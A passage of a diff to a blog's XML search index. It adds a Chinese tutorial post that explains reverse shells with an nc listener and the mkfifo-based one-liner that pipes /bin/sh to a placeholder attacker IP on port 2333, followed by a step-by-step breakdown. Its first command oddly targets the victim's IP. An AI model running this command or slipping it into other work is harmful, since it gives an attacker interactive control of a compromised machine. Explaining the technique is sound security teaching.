class="keyword">return</span> (n0 == (<span class="type">int</span>) Math.ceil(n / <span class="number">2.0</span>)) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>technology</category>
       </categories>
       <tags>
-        <tag>java</tag>
+        <tag>数据结构与算法</tag>
       </tags>
   </entry>
   <entry>
@@ -3898,6 +3872,32 @@
       <tags>
         <tag>设计模式</tag>
         <tag>编程思想</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过远程命令反弹shell</title>
+    <url>/technology/2017/05/%E8%BF%87%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h2 id="通过shell命令模拟反弹shell的攻击过程"><a href="#通过shell命令模拟反弹shell的攻击过程" class="headerlink" title="通过shell命令模拟反弹shell的攻击过程"></a>通过shell命令模拟反弹shell的攻击过程</h2><p>其中attcker_machine是攻击者的机器，也是最终shell反弹的目标机器。meat_machine是一台受攻击的肉鸡，是shell被反弹的机器。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&#123;attacker_machine_ip&#125; 监听2333端口</span></span><br><span class="line">nc -l -p 2333 -v </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反弹shell至&#123;meat_machine_ip&#125; 2333端口</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &#123;meat_machine_ip&#125; 2333 &gt;/tmp/bd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不从stderr传给stdout</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i &gt;&amp;1 | nc &#123;attacker_machine_ip&#125; 2333 &gt; /tmp/bd</span><br></pre></td></tr></table></figure>
+
+<p>mkfifo 是创建一个先进先出的文件，整个流程如下：</p>
+<ol>
+<li>先在受害机器上创建了一个先进先出的文件bd</li>
+<li>nc连接控制机，接受控制机的输入，传给bd这个文件</li>
+<li>cat 将bd文件内容传给&#x2F;bin&#x2F;sh 执行</li>
+<li><code>2&gt;&amp;1</code>是将stderr传给stdout，然后重定向给nc</li>
+<li>nc通过网络将结果传给了控制机</li>
+</ol>
+]]></content>
+      <categories>
+        <category>technology</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>web安全</tag>
+        <tag>shell</tag>
+        <tag>远程命令执行</tag>
+        <tag>nc</tag>
       </tags>
   </entry>
   <entry>
